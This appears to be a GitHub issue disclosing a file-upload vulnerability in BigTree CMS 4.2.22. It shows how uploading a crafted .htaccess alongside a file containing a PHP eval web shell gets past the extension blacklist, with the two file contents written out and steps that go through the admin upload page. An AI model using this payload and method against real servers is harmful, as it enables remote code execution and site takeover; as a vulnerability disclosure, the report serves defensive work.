[![@hazzel-cn](https://avatars.githubusercontent.com/u/17514803?u=b8b966b037c4026e11029fe6c9b1b2676d9afd2e&v=4&size=48)](/hazzel-cn)[hazzel-cn](https://github.com/hazzel-cn)opened [on Apr 25, 2018](https://github.com/bigtreecms/BigTree-CMS/issues/335#issue-317475089)
> Tested on 4.2.22
>
> Platform: Ubuntu + Apache2

# prerequisite

In the configuration of Apache, `AllowOverride` should be `All` for web directories so that `htaccess` in sub-directories can take effect. However, it is very **easy** to satisfy because the URL rewrite function also needs it.

# Rationale

Since BigTree needs to ensure the compatibility, it has to use blacklist to filter the extensions of uploaded files. However, while we cannot upload files ended with "ph\*", we can upload some files to change the rule of parsing.

Actually, we can upload a `.htaccess` to the server to make any files in the same directory executed as php files.

# Reproduction

### 1. Preparation

Prepare two files. One is a file named as `haozhe` or whatever you want. The other one is `.htaccess`

**In `haozhe`:**

```
<script language="php">eval($_GET['cmd']); phpinfo();</script>

```

**In `.htaccess`:**

```
<FilesMatch "haozhe."> # here is a dot in the filename.
SetHandler application/x-httpd-php
</FilesMatch>

```
### Upload Two files

In the page of <http://xx/bt3/site/index.php/admin/trees/add/> , click `Browse` button to upload a file. Upload these two files.

### It works!
